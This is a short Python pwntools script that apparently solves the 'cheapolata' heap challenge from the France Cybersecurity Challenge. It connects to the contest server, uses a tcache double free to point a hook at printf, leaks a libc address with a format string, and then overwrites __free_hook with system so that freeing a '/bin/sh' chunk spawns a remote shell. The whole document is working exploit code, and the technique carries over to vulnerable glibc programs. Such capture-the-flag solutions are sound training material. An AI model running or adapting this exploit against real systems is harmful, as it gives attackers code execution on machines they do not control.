from pwn import *


elf = ELF('./cheapolata', checksec=False)
libc = ELF('./libs/libc-2.27.so', checksec=False)
global p

def add(size, content):
    p.recvuntil(b">>> ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    p.sendline(size)
    p.recvuntil(b"Content: ")
    p.sendline(content)

def free():
    p.recvuntil(b">>> ")
    p.sendline(b"2")


#p = process(['/usr/bin/stdbuf', '-o', '0','./cheapolata'])

p = remote("challenges.france-cybersecurity-challenge.fr", 2106)


add(b"20", b"chunk20")
free()
free()

add(b"30", b"chunk30")
free()
free()

info("overwrting things")


add(b"20", p64(elf.sym['old_free_hook']))
add(b"20", b"junk")
add(b"20", p64(elf.plt['printf']))

add(b"20", b"%25$p")

free()
libc.address = int(p.recvuntil(b"==", drop=True),0) - 621607
info("libc @0x%hx" % libc.address)

add(b"30", p64(elf.sym['__free_hook']))
add(b"30", b"junk")
add(b"30", p64(libc.sym.system))

pause()
add(b"20", b"/bin/sh")

free()




p.interactive()
